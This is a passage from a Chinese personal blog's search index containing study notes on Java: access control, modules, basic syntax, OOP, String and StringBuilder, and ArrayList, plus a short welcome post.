接口和实现</h3><ul><li><p>访问控制常常被称为实现隐藏。将数据和方法包装在类中，并与实现隐藏相结合，称为封装（encapsulation）A。其结果就是具有特征和行为的数据类型</p></li><li><p>访问权限控制在数据类型的内部设置了访问边界的两个原因</p><ul><li><ol><li>确定客户程序员可以使用和不可以使用的内容</li></ol></li><li><ol start="2"><li>将接口与实现分离</li></ol></li></ul></li></ul><h3 id="7.4-%E7%B1%BB%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90" tabindex="-1">7.4 类的访问权限</h3><ul><li><p>访问权限修饰符可以出现在关键字 class 之前，实现对类的访问权限的控制</p></li><li><p>限制</p><ul><li>每个编译单元(文件)只能有一个public类<ul><li>每个编译单元都有一个由该 public类表示的公共接口。</li><li>它可以根据需要拥有任意数量的包访问权限的类。</li></ul></li><li>public类的名称必须和包含编译单元的文件名相匹配，包括大小写<ul><li>当然，编译单元里可以没有 public 类，这时可以随意命名文件，但会为阅读和维护代码的人带来困扰</li></ul></li></ul></li><li><p>创建包访问权限的类时</p><ul><li>将类的字段需要设置为包访问或者private</li><li>public字段只有在强制的场景才能设置，否则与包访问的概念相冲突</li></ul></li><li><p>类不能是private或protected的</p><ul><li>因此类只能是public或包访问</li><li>如果需要防止对类的访问，可以将构造器设置为private，从而禁止其他人创建该类的对象，而你则可以在这个类的静态方法中创建对象</li></ul></li></ul><h3 id="7.5-%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%9A%E6%A8%A1%E5%9D%97" tabindex="-1">7.5 新特性：模块</h3><ul><li>在 JDK 9 之前，Java 程序会依赖整个 Java 库。这意味着即使最简单的程序也带有大量从未使用过的库代码</li><li>JDK 9 最终引入了模块（module）：Java 库设计者现在可以将代码清晰地划分为模块，这些模块以编程的方式指定它们所依赖的每个模块，并定义导出哪些组件以及哪些组件完全不可用。。<ul><li>当使用库组件时，你会仅仅获得该组件的模块及其依赖项，不会有不使用的模块。</li><li>如果想继续使用隐藏的库组件，你必须启用“逃生舱口”（escape hatch），未来隐藏的库组件变更引发的问题都需要自己承担</li></ul></li></ul><h3 id="7.6-%E6%80%BB%E7%BB%93" tabindex="-1">7.6　总结</h3><ul><li><p>本章研究了类如何生成，以方便构建库：</p><ul><li>首先，介绍了一组类是如何被打包到一个库里的；</li><li>其次，介绍了类是如何控制对其成员的访问的。</li></ul></li><li><p>据估计，用 C 语言开发的项目，当代码量达到 5 万 ~10 万行时就会出现问题，因为C 语言只有单一的命名空间，这时候名称就开始冲突，导致额外的管理开销。</p></li><li><p>在 Java 中，通过 package 关键字、包命名方案和 import 关键字，你可以完全控制名称，因此很容易避免名称冲突的问题。</p></li><li><p>控制对成员的访问权限有两个原因</p><ul><li><ol><li>让用户远离他们不应该接触的部分</li></ol></li><li><ol start="2"><li>让库设计者可以改变类的内部实现，而不必担心会影响到客户程序员</li></ol></li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础（未完）</title>
      <link href="/2023/08/16/PL/java%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/08/16/PL/java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/PL/java%E5%9F%BA%E7%A1%80/xx.jpg" alt><br><a href="https://www.bilibili.com/video/BV1Fv4y1q7ZH/?vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><p>基础篇-9天<br>进阶篇-19天</p><h2 id="%E5%9F%BA%E7%A1%80%E7%AF%87" tabindex="-1">基础篇</h2><h3 id="day1" tabindex="-1">Day1</h3><ul><li><p>人机交互方式</p><ul><li>图形化：速度慢，占内存多</li><li>命令行：速度快，占内存小</li></ul></li><li><p>shutdown -s -t 300 计算机在300s后关机，可以坑人</p></li><li><p>java是美国Sun公司(Stanford University Network)在1995年推出的计算机语言，或被Oracle公司偏高</p></li><li><p>Java之父：詹姆斯·高斯林</p></li><li><p>Java三大平台</p><ul><li>Java SE<ul><li>Java语言的(标准版)，用于桌面开发应用，是其它两个版本的基础</li><li>桌面应用：用户只要打开程序，程序的界面会让用户在最短时间内找到它们的需要的功能，同时主动带领用户完成他们的工作并得到最好的体验</li><li>学习Java SE的目的：为今后要从事的Java EE开发，打基础</li></ul></li><li>Java ME<ul><li>java语言的(小型版)，用于嵌入式消费类电子设备</li></ul></li><li>Java EE<ul><li>java语言的企业版，用于Web方向的网站开发</li><li>网页：用于数据展示</li><li>网站：网页+后台服务器</li></ul></li></ul></li><li><p>java跨平台（即跨多操作系统）</p><ul><li>原理：在需要运行Java的应用程序的操作系统上，安装一个与Java对应的Java虚拟机(JVM Java Virtual Machine)</li></ul></li><li><p>下载JDK</p><ul><li>Java 8，11，17为：LTS（long-term suppor长期支持版）</li><li><a href="http://www.oracle.com">官网下载</a></li></ul></li><li><p>JDK的组成<img src="/images/PL/java%E5%9F%BA%E7%A1%80/JDK%E7%9A%84%E7%BB%84%E6%88%90.jpg" alt="JDK的组成"></p></li><li><p>IDEA概述</p><ul><li>目前业界公认的最好的Java集成开发环境</li><li>IDEA项目结构介绍<ul><li>project</li><li>moudle</li><li>package</li><li>class</li></ul></li></ul></li></ul><h3 id="day2" tabindex="-1">Day2</h3><ul><li><p>标识符命名规范</p><ul><li>小驼峰命名法<ul><li><ol><li>标识符是一个单词的时候，所有字母小写</li></ol></li><li><ol start="2"><li>标识符由多个单词组成的时候，从第二个单词开始，首字母大写</li></ol></li><li>该命名法多用于变量</li></ul></li><li>大驼峰命名法<ul><li><ol><li>标识符是一个单词的时候，首字母大写</li></ol></li><li><ol start="2"><li>标识符由多个单词组成的时候，每个单词的首字母大写</li></ol></li><li>该命名用于类的命名</li></ul></li></ul></li><li><p>整数类型，首选int，定义long类型变量需要加入L的标识</p></li><li><ol><li>基本得隐式转换</li></ol><ul><li>把一个取值范围小的数值或变量，赋值给另一个取值范围更大的变量</li></ul></li><li><ol start="2"><li>运算中的隐式变换</li></ol><ul><li>取值范围小的数据，和取值范围大得数据进行运算，小的会提升为大的再进行运算</li><li>byte，short，char，三种数据在运算时，会提升为int，再进行运算</li></ul></li><li><p>计算机中进制分类</p><ul><li>10进制：默认</li><li>2进制 ：0b开头</li><li>8进制 ：0开头</li><li>16进制：0x开头</li></ul></li></ul><h3 id="day3" tabindex="-1">Day3</h3><ul><li>方法(函数)<ul><li>方法调用内存<ul><li>方法没有被调用的时候，在<code>方法区</code>字节码文件中存放</li><li>方法被调用时，需要进入到<code>栈内存</code>中运行</li></ul></li><li>方法重载<ul><li>在同一个类中，定义了多个同名的方法，但每个方法具有不同的参数类型或参数个数，这些同名的方法，就构成了重载关系</li></ul></li></ul></li></ul><h3 id="day4" tabindex="-1">Day4</h3><ul><li>jdk14后，case后面允许编写多个数据，多个数据之间用逗号隔开</li></ul><pre><code class="language-java">switch(week)&#123;    case 1,2,3,4,5 -&gt; System.out.println(&quot;&quot;);    case 6,7 -&gt; System.out.println(&quot;&quot;);    default -&gt; System.out.println();&#125;</code></pre><h3 id="day5" tabindex="-1">Day5</h3><ul><li><p>数组遍历快捷键：<code>数组名.fori</code></p></li><li><p>数组初始化</p><ul><li>动态初始化：初始化时只指定数组长度，由系统为数组分配初始值</li><li>格式：<code>数据类型[] 数组名 = new 数据类型[数组长度]</code></li></ul></li><li><p>ctrl+alt+M：抽取方法的快捷键</p></li><li><p>Java内存分配</p><ul><li>方法去：字节码文件加载时进入的内存</li><li>栈内存：方法运行时进入的内存</li><li>堆内存：new出来的东西会在这块内存中开辟空间并产生地址</li></ul></li><li><p>Java二维数组</p><ul><li>二维数组在存储一维数组时，具体存储的是一维数组的地址</li></ul></li></ul><h3 id="day6" tabindex="-1">Day6</h3><p>讲习题，跳！</p><h3 id="day7" tabindex="-1">Day7</h3><ul><li><p>面向对象：并不是一种技术，而是一种编程的指导思想</p></li><li><p>面向对象程序设计(Object Oriented Programming)，OOP</p></li><li><p>Java中想要创建对象，必须先要有类的存在</p></li><li><p>类指的是一组相关属性和行为的集合，我们可以理解为是一张对象的设计图，一个类可以创建无限的对象</p></li><li><p>类的组成</p><ul><li>属性：成员变量<ul><li>跟之前定义变量的格式一样，但位置需要放在方法外面</li></ul></li><li>行为：成员方法<ul><li>跟之前定义方法格式一样，但需要去掉static</li></ul></li></ul></li><li><p>类的本质：对事物进行的描述</p></li><li><p>打印对象名，可以看到对象的内存地址</p><ul><li>全类名：包名+类名</li></ul></li></ul><table>  <thead>    </thead><td>区别</td>    <td>成员变量</td>    <td>局部变量</td>    <tr><td>类中位置不同</td>    <td>方法外</td>    <td>方法中</td></tr>  <tr><td>初始值不同</td>    <td>有默认初始值</td>    <td>没有，使用之前需要赋值</td></tr>  <tr><td>内存位置不同</td>    <td>堆内存</td>    <td>栈内存</td></tr>  <tr><td>生命周期不同</td>    <td>随着对象的创建而存在，随着对象的消失而消失</td>    <td>随着方法的调用而存在，随着方法的运行结束而结束</td></tr>  <tr><td>作用域</td>    <td>在自己所属的打括号中</td>    <td>在自己所属的打括号中</td></tr></table><ul><li><p>this关键字</p><ul><li>局部变量和成员变量重名时，使用就近原则</li><li>this关键字可以调用本类成员</li><li>this代表当前对象的引用</li></ul></li><li><p>构造方法</p><ul><li>初始化一个新建的对象，创建和构造对象的时候所调用的方法</li><li>格式<ul><li><ol><li>方法名与类名相同</li></ol></li><li><ol start="2"><li>没有返回值类型</li></ol></li><li><ol start="3"><li>没有具体的返回值</li></ol></li></ul></li><li>作用<ul><li><ol><li>本质作用：创建对象</li></ol></li><li><ol start="2"><li>结合执行时机：可以在创建对象的时候，给对象中的数据初始化</li></ol></li></ul></li><li>注意事项<ul><li><ol><li>构造方法的创建：如果没有定义构造方法，系统会给出一个默认的无参的构造方法</li></ol></li><li><ol start="2"><li>构造方法的重载：构造方法也是方法，允许重载</li></ol></li><li><ol start="3"><li>推荐使用方式：无参和有参的构造方法均自己给出</li></ol></li></ul></li></ul></li><li><p>面向对象三大特征：封装，继承，多态</p></li><li><p>封装：使用类设计对象时：将需要处理的数据，以及处理这些数据的方法，设计到对象中</p><ul><li>更好的维护数据</li><li>使用者无需关心内部实现，只要知道如何使用即可</li><li>封装的设计规范：合理隐藏，合理暴露</li><li>权限修饰符<ul><li>private：同一个类中<ul><li><ol><li>私有成员变量（保证数据安全性）</li></ol></li><li><ol start="2"><li>针对私有成员变量，提供setxxx，getxxx方法</li></ol></li></ul></li><li>（default）：同一个类中，同一个包中</li><li>protected：同一个类中，同一个包中，不同包的子类中</li><li>public：任意位置访问</li></ul></li></ul></li><li><p>标准JavaBean</p><ul><li><ol><li>这个类的成员变量都要私有，并提供对应的set和get方法</li></ol></li><li><ol start="2"><li>提供带参和无参的构造方法</li></ol></li><li>JavaBean是一个实体类</li></ul></li><li><p>实体类：实体类只负责数据存取，而对数据的处理交由其它类来完成，实现数据和数据业务处理相分离</p></li></ul><h3 id="day8" tabindex="-1">Day8</h3><ul><li><p>常用API（Application Programming Interface：应用编程接口）</p><ul><li>使用JDK的API帮助文档<ul><li><ol><li>看索引位置搜索自己要查看的类</li></ol></li><li><ol start="2"><li>看包，目的是看是不是Java.lang包（核心包），核心包不需要编写导包代码(import)</li></ol></li><li><ol start="3"><li>看这个类的介绍：弄清楚类的作用</li></ol></li><li><ol start="4"><li>看这个类的构造方法：为了创造该类的对象</li></ol></li><li><ol start="5"><li>看这个类的成员方法：方法名，参数，返回值，介绍</li></ol></li></ul></li></ul></li><li><p>String类</p><ul><li><ol><li>String是java核心包，所有程序中的双引号字符串都是String这个类的对象</li></ol></li><li><ol start="2"><li>字符串一旦被创建，就不可以被更改，字符串内容不可变更，想要更改只能使用新的对象，做替换</li></ol></li><li><ol start="3"><li>String字符串虽然不可以更改，但可以被共享</li></ol><ul><li>字符串常量池：当我们使用双引号创建字符串对象时，会检查常量池中是否存在该数据：不存在则创建，否则复用<ul><li>jdk7之前：StringTable在方法去，7之后在堆内存</li></ul></li></ul></li><li>字符串的两种构造方式<ul><li><ol><li>双引号直接创建</li></ol></li><li><ol start="2"><li>通过构造方法</li></ol></li><li>方法区别：双引号直接创建会在String Table中进行维护，而通过构造方法时，new方法会在堆中新开辟出一块内存</li></ul></li></ul></li></ul><pre><code class="language-java">String s=new String();//创建一个空白字符串String s=new String(char[] chs);//根据传入的字符数组，创建字符串对象String s=new String(&quot;abs&quot;);//根据传入的字符串来创建字符对象</code></pre><ul><li>String中的比较方法</li></ul><pre><code class="language-java">public boolean equals(Object anObject) //将此字符串与指定字符串进行比较public boolean equalsIgnoreCase(String anotherString) //忽略大小写进行字符串比较</code></pre><ul><li>String字符串的遍历<ul><li>char[] toCharArray(); 将字符串转化为字符数组</li><li>char charAt(int index); 根据指定索引返回对应位置字符</li><li>int length(); 返回字符串的长度，这是一个方法</li></ul></li><li>String的截取方法 类似C++的<ul><li>String substring(int beginIndex);</li><li>String substring(int beginIndex,int endIndex); 这个方法左闭右开</li></ul></li><li>String的替换方法<ul><li>String replace(CharSequence target,CharSequence replacement)<ul><li>参数1为旧值，参数二为新值，自动将旧值替换为新值</li></ul></li><li>String replaceAll(String regex,String replacement)<ul><li>使用replacement替换所有符合regex<strong>正则表达式</strong>的字符串</li></ul></li><li>String replaceFirst(String regex,String replacement)<ul><li>使用replacement替换第一个符合regex<strong>正则表达式</strong>的字符串</li></ul></li></ul></li><li>String的拆分方法<ul><li>Sting[] split(String regex) 根据给定<strong>正则表达式</strong>的匹配拆分字符串</li></ul><pre><code class="language-java">String s=&quot;192,168,1,1&quot;;String[] sArr=s.split(&quot;,&quot;);//如果要匹配字符 &quot;.&quot; 需要转义字符 &quot;//.&quot;sAA=&#123;&quot;192&quot;,&quot;168&quot;,&quot;1&quot;,&quot;1&quot;&#125;;</code></pre></li></ul><pre><code class="language-java">long time = System.currentTimeMillis();获取从19700101 0时0分到现在有多少毫秒  </code></pre><ul><li>StringBuilder的引入<ul><li>作用：提高字符串的操作效率</li><li>介绍：<ul><li><ol><li>一个可变的字符序列</li></ol></li><li><ol start="2"><li>StringBuilder是字符串缓冲区，可以理解为容器，这个容器可以存储任意数据，但其里面自动转为字符串</li></ol></li></ul></li><li>构造方法<ul><li>public StringBuilder(); 创建一个空白字符串缓冲区，初始容量16个字符</li><li>public StringBuilder(String str);</li></ul></li><li>常用成员方法<ul><li>public StringBuilder append(任意类型): 添加数据返回对象自己<ul><li>s.append(“a”).append(“b”)：链式编程：调用的方法，返回的结果是对象，就可以继续向下调用方法</li></ul></li><li>public StringBuilder reverse():将缓冲区中的内容进行反转</li><li>public int length()</li><li>public toString() 将缓冲区的内容以String类型返回</li></ul></li></ul></li><li>StringBuilder和StringBuffer<ul><li>方法都一样</li><li>但是StringBuilder是线程不安全的，StringBuffer是线程安全的，因此StringBuilder效率高一些，而StringBuffer效率慢一些</li></ul></li></ul><h3 id="day9" tabindex="-1">day9</h3><ul><li><p>集合基础</p><ul><li>集合是一种容器，装数据，类似数组</li><li>数组的局限：数组定义并启动后，长度即固定</li><li>但是集合大小可变</li></ul></li><li><p>Array长度可变原理</p><ul><li><ol><li>当创建Array集合容器的时候，底层会存在一个长度为10个大小的空数组</li></ol></li><li><ol start="2"><li>随后扩容原数组1.5倍大小的新数组</li></ol></li><li><ol start="3"><li>将原数组拷贝到新数组种</li></ol></li><li><ol start="4"><li>将新元素添加到新数组</li></ol></li></ul></li><li><p>ArrayList</p><ul><li><ol><li>构造方法：<code>public ArrayList()</code> 创建一个空的集合容器</li></ol></li><li><ol start="2"><li>指定类型的构造方法 <code>ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;()</code> <code>&lt;&gt;</code>是一个泛型</li></ol></li><li>常用方法<img src="/images/PL/java%E5%9F%BA%E7%A1%80/ArrayList%E9%9B%86%E5%90%88%E5%B8%B8%E7%94%A8%E6%88%90%E5%91%98%E5%87%BD%E6%95%B0.jpg" alt></li></ul></li></ul><h2 id="%E8%BF%9B%E9%98%B6%E7%AF%87" tabindex="-1">进阶篇</h2><p>进阶篇转战看书 On java 8 了，感觉自己也不是很急，不如稳稳地看书系统地学习java，<a href="https://mrcold2002.github.io/2023/06/25/PL/On%20java8/">博客地址</a></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Hexo World</title>
      <link href="/2023/08/16/hello-world/"/>
      <url>/2023/08/16/hello-world/</url>
      
        <content type="html"><![CDATA[<img src="/images/meitu/1.jpg"><p>该博客就此投入使用，用以记录一些笔记及学习。</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
